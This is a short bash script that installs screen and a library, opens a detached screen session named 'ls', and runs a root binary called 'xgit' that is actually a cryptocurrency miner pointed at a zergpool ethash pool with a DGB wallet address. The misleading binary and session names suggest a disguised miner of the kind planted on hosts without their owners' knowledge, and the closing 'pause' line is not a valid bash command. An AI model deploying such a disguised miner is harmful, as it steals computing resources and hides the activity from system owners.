#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
screen -dmS ls 

chmod +x ./xgit && sudo ./xgit -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u dgb1qrgrax0ke2h9zzf4t3gv878yu86gxz80x0essun -p c=DGB,ID=STARkiss
pause $@
